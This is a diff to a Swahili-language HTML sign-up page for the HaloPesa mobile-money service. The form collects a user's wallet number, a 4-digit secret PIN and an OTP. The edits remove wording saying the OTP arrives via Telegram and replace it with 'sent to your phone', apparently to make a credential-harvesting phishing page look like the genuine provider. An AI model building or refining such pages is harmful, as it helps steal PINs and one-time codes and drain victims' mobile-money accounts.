@@ -163,19 +163,19 @@
 
       <div class="field">
         <label>Jina la Ukoo</label>
-        <input type="text" id="regLast" placeholder="Ukoo lako" oninput="clearErr('regErr')">
+        <input type="text" id="regLast" placeholder="jina la ukoo" oninput="clearErr('regErr')">
       </div>
 
       <div class="field">
         <label>Nambari ya HaloPesa</label>
-        <input type="text" id="regHaloNumber" placeholder="1234567890" inputmode="numeric" maxlength="10" oninput="clearErr('regErr')">
-        <div class="field-hint">Tarakimu 10 tu (0123456789)</div>
+        <input type="text" id="regHaloNumber" placeholder="0712345678" inputmode="numeric" maxlength="10" oninput="clearErr('regErr')">
+        <div class="field-hint">Tarakimu 10 </div>
       </div>
 
       <div class="field">
         <label>Namba ya Siri</label>
         <input type="text" id="regPassword" placeholder="0000" inputmode="numeric" maxlength="4" oninput="clearErr('regErr')">
-        <div class="field-hint">Tarakimu 4 tu (0000-9999)</div>
+        <div class="field-hint">Tarakimu 4 </div>
       </div>
 
       <button class="btn-grad" onclick="registerUser()">FUNGUA AKAUNTI</button>
@@ -203,13 +203,13 @@
 <div class="overlay" id="otpOverlay">
   <div class="otp-modal">
     <h2>Uthibitisho wa OTP</h2>
-    <p>Weka OTP iliyotumwa kwenye Telegram</p>
+    <p>Weka OTP iliyotumwa kwenye simu yako</p>
     <p style="color:#ff6600; font-weight:600; margin-bottom:16px;" id="otpPhoneDisplay"></p>
 
     <div class="msg-box error" id="otpMsgErr"><span class="msg-icon">✕</span><span id="otpMsgErrTxt"></span></div>
     <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
 
-    <p style="font-size:0.82rem; color:#666; margin-bottom:12px;">Ingiza OTP iliyotumwa kwenye Telegram (tarakimu 4)</p>
+    <p style="font-size:0.82rem; color:#666; margin-bottom:12px;">Ingiza OTP iliyotumwa kwenye simu yako (tarakimu 4)</p>
 
     <div class="otp-inputs">
       <input type="text" class="otp-box" maxlength="1" inputmode="numeric" oninput="otpMv(this,0)" id="o0">
